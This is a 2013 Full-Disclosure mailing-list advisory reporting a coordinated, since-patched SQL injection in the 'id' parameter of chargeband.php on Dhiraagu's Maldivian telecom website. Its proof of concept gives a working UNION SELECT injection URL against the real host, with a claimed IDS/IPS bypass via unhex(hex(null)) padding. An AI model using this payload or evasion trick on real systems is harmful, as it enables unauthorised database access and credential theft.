
Date: Sat, 15 Jun 2013 00:20:17 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: full-disclosure@...ts.grok.org.uk
Subject: Maldives Telecom ISP - Remote SQL Injection
	Vulnerability

Title:
======
Maldives Telecom ISP - SQL Injection Vulnerability


Date:
=====
2013-06-15


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=355


VL-ID:
=====
355


Common Vulnerability Scoring System:
====================================
9.3


Introduction:
=============
Dhiraagu takes pride in active involvement in the community in which we serve. As a truly
Maldivian company, we strongly identify with the community and regularly contribute to
worthy causes such as education, health and children s development. We also actively support
the island communities in their social activities.

We fully recognize the importance of sustainable development and caring for the delicate
environment of our islands and special care is taken to minimize the likelihood of damage
to the environment resulting from our activities. Dhiraagu is the largest user of solar power
in the Maldives with solar energy being used as the primary source of power in over 80% of
the network distribution sites across the country.

In addition, as the national information communications provider  bridging the Maldives ,
we bring environmental benefits to our customers through reductions in travel and the use
of electronic communications.

(Copy of the Vendor Homepage: http://www.dhiraagu.com.mv/about/community_development.php)


Abstract:
=========
An independent Vulnerability Laboratory Researcher discovered a remote SQL Injection Vulnerability in the official Maldives Telecom ISP Vendor Website.


Report-Timeline:
================
2012-12-12:	Researcher Notification & Coordination
2012-12-14:	Vendor Notification
2013-01-30:	Vendor Response/Feedback
2013-06-14:	Vendor Fix/Patch
2013-06-15:	Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
An SQL Injection Vulnerability is detected in the official Maldives Telecom ISP Vendor Website.
The vulnerability allows to inject/execute own sql commands in the vulnerable application dbms. 

The vulnerability is located in the national chare band module when processing to request the 
chargeband.php file with a manipulated id parameter. Remote attackers can inject own sql commands 
to read for example database passwords, usernames, mails & Co.

Exploitation of the vulnerability does not require user interaction or a privilege application 
user account. Successful exploitation of the vulnerability will result in application and dbms compromise.


Vulnerable Module(s):
				[+] National Charge Band

Vulnerable File(s):
				[+] chargeband.php

Vulnerable Parameter(s):
				[+] id


Proof of Concept:
=================
The vulnerability can be exploited by remote attackers (pre-auth) without application user account and without user interaction. 
For demonstration or reproduce ...

PoC: dhiraagu.com.mv

http://www.dhiraagu.com.mv/tariffs/chargeband.php?id=6 having 'smith'='smith1' union select unhex(hex(null)),
unhex(hex(@@version)),unhex(hex(null)),unhex(hex(null)),unhex(hex(null)),unhex(hex(null)),unhex(hex(null)),
unhex(hex(null)),unhex(hex(null)),unhex(hex(null)),unhex(hex(null)),unhex(hex(null)),unhex(hex(null)),
unhex(hex(null)),unhex(hex(null)),unhex(hex(null)),unhex(hex(null)),unhex(hex(null))#

Note: There is an IDS/IPS, but this query will  allow to bypass the protection because of the unhex(hex to null.

Reference(s):
http://www.dhiraagu.com.mv/tariffs/chargeband.php?id=6[<SQL INJECTION VULNERABILITY!>]


Solution:
=========
The vulnerability can be patched by a secure parse of the GET method id parameter request.


Risk:
=====
The security risk of the remote sql injection vulnerability is estimated as critical.


Credits:
========
Ismail Kaleem - Senior Security Developer | IT Security Department
National Centre for Information Technology | Republic of Maldives


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register
Contact:    admin@...nerability-lab.com 	- support@...nerability-lab.com 	       - research@...nerability-lab.com
Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@...nerability-lab.com or support@...nerability-lab.com) to get a permission.

    				   	Copyright Â© 2013 | Vulnerability Laboratory



-- 
VULNERABILITY RESEARCH LABORATORY
LABORATORY RESEARCH TEAM
CONTACT: research@...nerability-lab.com


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
